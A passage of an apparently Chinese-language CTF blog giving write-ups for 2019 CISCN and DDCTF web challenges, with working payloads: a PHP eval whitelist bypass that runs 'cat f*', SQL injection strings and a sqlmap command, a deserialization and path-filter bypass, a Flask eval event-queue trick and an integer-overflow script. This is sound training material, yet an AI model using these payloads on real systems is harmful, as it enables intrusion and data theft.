&amp;&amp; !empty($_POST['password']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['sql']) &amp;&amp; !empty($_POST['database'])) { $conn = new mysqli(); $conn -&gt; connect($_POST['host'], $_POST['username'], $_POST['password'], $_POST['database'], 3306); if ($conn -&gt; connect_errno) { echo \"&lt;p style='color: red'&gt;数据库连接失败: \" . $conn -&gt; connect_error . \"&lt;/p&gt;\"; } else { $conn -&gt; set_charset(\"utf8\"); $result = $conn -&gt; query($_POST['sql']); if (!$result) { echo \"&lt;p style='color: red'&gt;SQL执行失败！&lt;/p&gt;\"; }else { echo \"&lt;p style='color: green'&gt;SQL执行成功！&lt;/p&gt;\"; } $conn -&gt; close(); } }else { echo \"&lt;p style='color: green'&gt;你可以在这里对远程数据库进行操作！&lt;/p&gt;\"; } } ?&gt; &lt;hr&gt; &lt;p&gt;&lt;/p&gt; &lt;form action=\"\" method=\"post\" class=\"row\"&gt; &lt;?php if (!$_SESSION['admin']) { echo '&lt;input type=\"text\" name=\"username\" class=\"col-6 col-lg-4\" placeholder=\"username\"&gt;'; echo '&lt;input type=\"text\" name=\"password\" class=\"col-6 col-lg-4\" placeholder=\"password\"&gt;'; }else { echo '&lt;input type=\"text\" name=\"host\" class=\"col-6 col-lg-4\" placeholder=\"host\"&gt;'; echo '&lt;input type=\"text\" name=\"username\" class=\"col-6 col-lg-4\" placeholder=\"username\"&gt;'; echo '&lt;input type=\"text\" name=\"password\" class=\"col-6 col-lg-4\" placeholder=\"password\"&gt;'; echo '&lt;input type=\"text\" name=\"database\" class=\"col-6 col-lg-4\" placeholder=\"database\"&gt;'; echo '&lt;input type=\"text\" name=\"sql\" class=\"col-6 col-lg-4\" placeholder=\"sql\"&gt;'; } ?&gt; &lt;input type=\"submit\" class=\"col-6 col-lg-4\" value=\"submit\"&gt; &lt;/form&gt;&lt;/div&gt; &lt;!-- /container --&gt;&lt;/body&gt;&lt;/html&gt; 这题比较可惜，时间不太够，比赛结束的40min多就做出来了…今天太困了，中午睡了好一会，时间足够的话肯定能搞出来的…可惜可惜。 最近看了还可以有 1union select cot(1 and left(database(),1)&gt;'a');# 这样的 bool 盲注的形式 Day 2WebLove_Math12345678910111213141516171819202122232425262728 &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';');} 一上午都在懵逼，要么找到可以突破的数学函数，要么突破正则，应该就是这两种思路了。数学函数都看了一遍，貌似没有什么可以利用的函数。正则匹配/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/，这个是 php 变量文档中匹配有效变量名的正则。感觉两个思路都不对…最有可能的还是突破数学函数…数组可以绕之前的，但是eval不能执行 看了好几遍直到看到了base_convert可以在进制转换上做文章，而且根据php文档–base_convert，我们可以知道 1frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。 也就是第二位，第三位参数可以在 2 到 36 之间，而且高于十进制的用字母表示！既然拼接进去的都是字符串，转换出来拼接进去应该可以执行。 本地使用base_convert(55490343972,10,36)()成功执行phpinfo，远程也执行了phpinfo看看是不是有什么问题，看了一圈然而并没有发现什么问题。 然后尝试使用各种执行命令 12345base_convert(15941,10,36); //catbase_convert(1751504350,36,10); //systembase_convert(696468,36,10); //execbase_convert(784,36,10); //lsbase_convert(21269,36,10); //GET 虽然可以执行ls了，看到了flag.php，但是读不到就比较难受了。然后直接就考虑到了是不是可以有cat *这种操作，但是空格跟*都无法编码…这就比较头疼了。而且主要是还得全为数字，有字母的的话就会进whitelist的判断了。 所以可能要尽量避免去使用十六进制什么的含有字母的，考虑到 ascii 码可以转换，又尝试了使用chr函数去转换 12345($pi=base_convert(9453,12,36)).$pi(101).$pi(120).$pi(101).$pi(99)($pi(99).$pi(97).$pi(116).$pi(32).$pi(42))($pi=base_convert(9453,12,36)).$pi(101).$pi(120).$pi(101).$pi(99)($pi(108).$pi(115))$pi(96).$pi(108).$pi(115).$pi(96) 一般的构造结果肯定不行…所以这里想用`ls`这种形式去执行命令，但是由于拼接的原因，一直不能执行…思路卡了很久。 看了一些相关十六进制处理的函数，直到看到了两个函数，一个hex2bin函数，是可以把 16 进制转换成字符串，一个dechex函数，把十进制转换成十六进制。 于是我们可以有 1234php &gt; echo base_convert('636174202a',16,10);426836762666php &gt; echo hex2bin(dechex(426836762666));cat * 这样我们就可以把*这个十六进制为2a的转成十进制纯数字的了。 但是我们要怎么利用hex2bin呢，想到可以利用base_convert赋值变量的方式，找到最短的字符串pi，利用$pi=base_convert(37907361743,10,36)构造出hex2bin。 而且还因为echo可以接受如下的拼接方式，例如 1234php &gt; echo (1).`id`;1uid=501(zedd) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)php &gt; echo 1,`id`;1uid=501(zedd) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh) 尽量取最短的，这里肯定我们就用,这个形式。 所以大致思路就差不多出来了利用base_convert构造hex2bin，然后用最短的可以执行命令的exec函数去执行cat *的命令 1$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(426836762666))) 然而没成功…不知道哪里错了，感觉没道理… 123($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570206167));($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570202466)); 接着队友说可以用rgrep ag去弄，而且本地打通了…但是远程以上没打通…我又修改了尝试去rgrep fl，也没打通，当时是这样的 写 wp 的时候，突然又发现可以打通了… 也是神奇…最后当时还是按照自己的思路去走了，感觉是不是哪里出问题了，确定有flag.php，最后尝试修改cat f*， 1234php &gt; echo base_convert('63617420662a',16,10);109270211257898php &gt; echo hex2bin(dechex(109270211257898));cat f* 1$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(109270211257898))) 拿到 flag（复现环境下） 1base_convert(37907361743,10,36)(dechex(1598506324));($$pi){1}(($$pi){2})&amp;1=system&amp;2=cat%20flag.php 剩余一题感觉比较有意思，单独写一下。","link":"/2019/05/06/2019ciscn/"},{"title":"2019 DDCTF Web wp","text":"2019 DDCTF web writeup [TOC] Web1 滴～DescriptionNULL 题目地址：http://117.51.150.246 Hacking文件读取 1&lt;title&gt;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&lt;/title&gt;index.php&lt;/br&gt;index.php&lt;/br&gt;&lt;img src='data:image/gif;base64,PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo='&gt;&lt;/img&gt; 直接读 index.php 得到 1234567891011121314151617181920212223242526&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header('content-type:text/html;charset=utf-8');if(! isset($_GET['jpg'])) header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;';$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);echo $file.'&lt;/br&gt;';$file = str_replace(\"config\",\"!\", $file);echo $file.'&lt;/br&gt;';$txt = base64_encode(file_get_contents($file));echo \"&lt;img src='data:image/gif;base64,\".$txt.\"'&gt;&lt;/img&gt;\";/* * Can you find the flag file? * */?&gt; 找到类似的原题，但是原题利用了.idea文件泄露，这里并没有，留下的只是一个深深的巨坑，首先看 php 顶部链接找到博客，然后发现这篇博客日期不对。找到该博主7月4日的博客，发现是一篇名为vim 异常退出 swp文件提示的博客，看文章内容发现有一个恢复.practice.txt.swp的操作。 结果这里是个巨坑，最后是要拿到的文件是practice.txt.swp，并没有开头的.符号…然后提示f1ag!ddctf.php，然后去读这个文件源码，得到 123456789101112131415161718&lt;?phpinclude('config.php');$k = 'hello';extract($_GET);if(isset($uid)){ $content=trim(file_get_contents($k)); if($uid==$content)true{truetrueecho $flag;true}trueelsetrue{truetrueecho'hello';true}}?&gt; 很简单的变量覆盖。 Web 2 WEB 签到题DescriptionNULL 题目地址：http://117.51.158.44/index.php Hackingurl:app/Application.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344Class Application { var $path = ''; public function response($data, $errMsg = 'success') { $ret = ['errMsg' =&gt; $errMsg, 'data' =&gt; $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) { $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; }else{ $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path;}public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),'Congratulations'); } exit();}} url:app/Session.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111include 'Application.php';class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() {trueif(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this-&gt;session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { parent::response('the ip addree not match'.'error'); return FALSE; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); }}$ddctf = new Session();$ddctf-&gt;index(); 我们可以看到 Application.php 中的关键代码 12345public function __destruct(){ //...true $this-&gt;response($data = file_get_contents($path), 'Congratulations'); true //...} 而且在session.php中我们可以找到一处反序列化的地方，所以很明显就需要我们去构建一个反序列化漏洞，利用这里去读取../config/flag.txt 我们在session.php中发现关键代码 12345678if (!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"], $this-&gt;eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k =&gt; $v) { $data = sprintf($data, $v); } parent::response($data, \"Welcome\");} 这里循环使用sprintf格式化打印$arr，所以我们只需要让第二次存在一个%s，即可让他打印出$this-&gt;eacrykey，所以可以构造nickname=%s即可得到$this-&gt;eacrykey为 EzblrbNS 之后我们可以发现主要就是要构造$session这个变量来触发session_read()函数中的$session = unserialize($session); 于是我们可以先从服务器获取session_create()得到的数据如下 1a:4:{s:10:\"session_id\";s:32:\"9e887a62624202e40d11881772b19569\";s:10:\"ip_address\";s:11:\"157.0.25.86\";s:10:\"user_agent\";s:82:\"Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.14;+rv:66.0)+Gecko/20100101+Firefox/66.0\";s:9:\"user_data\";s:0:\"\";}a170c04974e03dc5cc763c0ab32d6905; 我们就可以得到 ip 了，接下里我们只需要去构造反序列化Application这个类就好了。 这个类也很简单，主要就是绕过它的这个sanitizepath()方法即可，我们双写就可以绕过了。 1var $path = \"..././config/flag.txt\"; 所以我们可以在 session.php 中自己本地搭一下 12345678910111213141516171819202122232425private function session_create(){ $sessionid = ''; while (strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0, mt_getrandmax()); } $a = new Application(); $userdata = array( 'session_id' =&gt; '272a4339b6b9340dad9466656d869286', 'ip_address' =&gt; '157.0.25.86', 'user_agent' =&gt; $a, 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata . md5($this-&gt;eancrykey . $cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); } session_id 修改为服务器获取得到的 session_id 即可，ip_address 服务器也返回了，填上去了就好了。这样我们本地搭起环境，从 http 头中拿到 cookie ，用这个 cookie 访问服务器即可拿到 flag 了。 Web 3 Upload-IMGDescriptionhttp://117.51.148.166/upload.phpuser：dd@ctfpass：DD@ctf#000 HackingCREATOR: gd-jpeg v1.0 (using IJG JPEG v80) 其他人可以直接用搜到的 jpg_payload.php 可以直接随便拿一个图片都可以拿到 flag ，而我就不行了…应该是图片的原因…. 最后自己按照这个 GitHub 仓库 生成拿到了 flag… Web 4 homebrew event loopDescriptionhttp://116.85.48.107:5002/d5af31f96147e657Flag格式：DDCTF{.....}，也就是请手动包裹上DDCTF{} Hacking123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147# -*- encoding: utf-8 -*-# written in python 2.7__author__ = 'garzon'from flask import Flask, session, request, Responseimport urllibapp = Flask(__name__)app.secret_key = '*********************' # censoredurl_prefix = '/d5af31f96147e657'def FLAG(): return 'FLAG_is_here_but_i_wont_show_you' # censored def trigger_event(event): session['log'].append(event) if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event)def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: passdef execute_event_loop(): valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None while len(request.event_queue) &gt; 0: event = request.event_queue[0] # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: event_handler = eval(action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' resp += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp @app.route(url_prefix+'/')def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: querystring = 'action:index;False#False' if 'num_items' not in session: session['num_items'] = 0 session['points'] = 3 session['log'] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop()# handlers/functions below --------------------------------------def view_handler(args): page = args[0] html = '' html += '[INFO] you have {} diamonds, {} points now.&lt;br /&gt;'.format(session['num_items'], session['points']) if page == 'index': html += '&lt;a href=\"./?action:index;True%23False\"&gt;View source code&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;shop\"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;reset\"&gt;Reset&lt;/a&gt;&lt;br /&gt;' elif page == 'shop': html += '&lt;a href=\"./?action:buy;1\"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;' elif page == 'reset': del session['num_items'] html += 'Session reset.&lt;br /&gt;' html += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' return htmldef index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == 'True': source = open('eventLoop.py', 'r') html = '' if bool_download_source != 'True': html += '&lt;a href=\"./?action:index;True%23True\"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;' html += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' for line in source: if bool_download_source != 'True': html += line.replace('&amp;','&amp;amp;').replace('\\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;','&amp;gt;').replace('\\n', '&lt;br /&gt;') else: html += line source.close() if bool_download_source == 'True': headers = {} headers['Content-Type'] = 'text/plain' headers['Content-Disposition'] = 'attachment; filename=serve.py' return Response(html, headers=headers) else: return html else: trigger_event('action:view;index') def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return 'invalid number({}) of diamonds to buy&lt;br /&gt;'.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index']) def consume_point_function(args): point_to_consume = int(args[0]) if session['points'] &lt; point_to_consume: raise RollBackException() session['points'] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) &lt;br /&gt;' def get_flag_handler(args): if session['num_items'] &gt;= 5: trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries trigger_event('action:view;index') if __name__ == '__main__': app.run(debug=False, host='0.0.0.0') 一个比较简单的 Flask 框架，提供使用 points 购买 diamonds 的功能，然后将操作记录写进session['log'] 里面。 整个代码还是比较简单的，而且漏洞点也相对比较明显。其实每个语言的eval函数都差不多，比如这里 python 的eval函数，类似于 php 中的eval，也可以将eval中的字符串当作代码来处理。 所以这意味着什么呢？这就意味着可以使用#注释我们不需要的代码。 举个例子： 1234&gt;&gt;&gt; eval(\"print(1)\")1&gt;&gt;&gt; eval(\"print(1)#do something)\")1 所以我们就可以利用这个特性，利用题目中的event_handler来执行任意函数。 利用#成功绕过了后缀的限制执行了show_flag_function函数。 虽然可以直接执行getFlag函数，但是这个函数还是有一个限制session['num_items'] &gt;= 5，即使可以直接执行但是因为这个判断也无法绕过。所以这里可以有一些思路，比如找一个可以由int函数转换成负数的数，或者直接打印函数什么。但是两种基本都走不通… CTF 魅力所在可能就是可以让你利用你能利用的一切去创造一些新的途径达到自己目的。 既然要绕过session['num_items'] &gt;= 5的判断，我们就需要通过buy_handler来增加自己的物品数，然而这个函数里面我们可以看到 12345def buy_handler(args): num_items = int(args[0]) if num_items &lt;= 0: return 'invalid number({}) of diamonds to buy&lt;br /&gt;'.format(args[0]) session['num_items'] += num_items trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index']) 最后一行并没有直接调用consume_point_function，而是通过调用trigger_event来调用花费的函数。 然而我们可以看到trigger_event函数 1234567def trigger_event(event): session['log'].append(event) if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) 只不过是用来增加session记录而已，并没有立即去调用consume_point_function，所以如果我们在buy_handler与consume_point_function两个函数之间执行get_Flag函数，就可以先增加自己的item来绕过get_Flag函数对于item的判断，尽管之后会执行consume_point_function函数，但是 Flag 已经被我们打印出来了，所以后面即使会回滚也无关紧要了。 所以如何构造这个 payload 达到我们在buy_handler之后立即执行get_Flag函数呢。让我们来看看整个代码的逻辑。首先代码会进入entry_point函数，并将querystring传入trigger_event函数，trigger_event将行动记录到session['log']当中，接着执行execute_event_loop函数。 我们重点来看execute_event_loop这个函数。 123456789101112131415161718192021222324252627282930313233def execute_event_loop(): valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') resp = None while len(request.event_queue) &gt; 0: event = request.event_queue[0] # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\" request.event_queue = request.event_queue[1:] if not event.startswith(('action:', 'func:')): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == 'a' action = get_mid_str(event, ':', ';') args = get_mid_str(event, action+';').split('#') try: event_handler = eval(action + ('_handler' if is_action else '_function')) ret_val = event_handler(args) except RollBackException: if resp is None: resp = '' resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' resp += '&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' session['num_items'] = request.prev_session['num_items'] session['points'] = request.prev_session['points'] break except Exception, e: if resp is None: resp = '' #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == '': resp = ('404 NOT FOUND', 404) session.modified = True return resp 这个函数进入循环执行函数的条件为while len(request.event_queue) &gt; 0，而trigger_event函数是可以控制request.event_queue的关键，所以按照我们之前的思路，我们是不是可以利用这个函数来控制我们的执行顺序呢？ 例如我们可以先尝试构造action:trigger_event%23;action:buy;8，我们本地可以通过app.logger.info来查看execute_event_loop循环中的action与args参数，我们可以得到 可以看到执行了but_handler函数，我们注意trigger_event中是可以接受数组的 12if type(event) == type([]): request.event_queue += event 对于数组的处理，他会挨个加入到request.event_queue，所以我们就可以利用传入数组来控制执行顺序，只要我们传入一个第一个参数为but_handler的函数，第二个参数为get_Flag的函数就可以实现在调用花费函数之前来输出 Flag 了。 怎么构造数组呢？在execute_event_loop中对于参数的处理可以自己随便测试一下就知道了他是以:;之后的字符串以#为分割来形成数组的。 所以这样子我们就成功将get_flag函数优先调用了。接下来就是处理一些细节的事情了，比如调用get_Flag在源代码中是get_flag_handler，所以我们需要传入的参数是action:get_flag，以及 Flag 最后是通过以下函数调用trigger_event把 Flag 输出到session['log']当中的。 1234def get_flag_handler(args): if session['num_items'] &gt;= 5: trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries trigger_event('action:view;index') 所以我们的 payload 就是action:trigger_event%23;action:buy;8%23action:get_flag;，再通过p牛的 flask cookie 解密脚本即可得到 flag Web 5 欢迎报名DDCTFDescriptionhttp://117.51.147.2/Ze02pQYLf5gGNyMn/ 提示：XSS不是获取cookie提示2：之后是注入 Hacking一开始根本打不了…而且还被人用 Beff 搅屎了…而且严重怀疑这题是中途改题的…很坑 首先题目设置比较简单 测试 XSS ，但是贼坑的误导你，返回了想误导你走入 sql 注入的大坑。 我们可以用 xss 拿到 admin.php 的 html 源码 看到源码中一个接口，直接访问提示需要一个 id 的传参，随便输入之后看到响应包 123456789HTTP/1.1 200 OKDate: Thu, 25 Apr 2019 03:06:39 GMTServer: ApacheContent-Length: 31Connection: closeContent-Type: text/html;charset=gbk&lt;title&gt;List Query API&lt;/title&gt; 发现Content-Type为charset=gbk，猜测是一个宽字节注入。而且并没有什么过滤，直接开注，可能唯一需要一点 trick 的就是需要用十六进制绕过被转义的单引号了… 注出库名 注出表名 注出字段名 拿到 flag 当然也可以用 sqlmap 直接跑。 也可以指定使用--tamper unmagicquotes来进行注入 1python sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex --level 3 -D ctfdb -T ctf_fhmHRPL5 --dump Web 6 大吉大利，今晚吃鸡～Descriptionhttp://117.51.147.155:5050/index.html#/login注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~ 本题不需要使用扫描器 Hacking一开始一直在溢出购买的这里，但是一旦溢出了，服务器就返回 500 了… 123456789GET /ctf/api/buy_ticket?ticket_price=2000 HTTP/1.1Host: 117.51.147.155:5050User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0Accept: application/jsonAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://117.51.147.155:5050/index.htmlConnection: closeCookie: user_name=zedd; REVEL_SESSION=ef66cfc3f5199180eea686597f4a1e72 然后看到一道类似护网杯Itshop题目，所以考虑这个地方是不是也是用的是余额-支出这么个操作来溢出呢 查找 GoLang 的相关数据类型，用 uint32 成功溢出。 猜测在 price 转换成 int 的时候发生溢出变成 -1 ，导致余额减去花费大于0，成功绕过判断买到入场券。 之后就比较简单了，可以通过输入 ticket 杀 bot ，猜测 id 与 ticket 有某种映射关系，可以注册一系列小号买 ticket 保大号杀。 附上脚本。 123456789101112131415161718192021222324252627282930313233343536373839import requestsimport reimport timeusername = 'zedde'base_url = 'http://117.51.147.155:5050'register = base_url + '/ctf/api/register?name={0}&amp;password=12345678'buy_url = base_url + '/ctf/api/buy_ticket?ticket_price=4294967296'search_url = base_url + '/ctf/api/search_bill_info'pay_url = base_url + '/ctf/api/pay_ticket?bill_id='remove_url 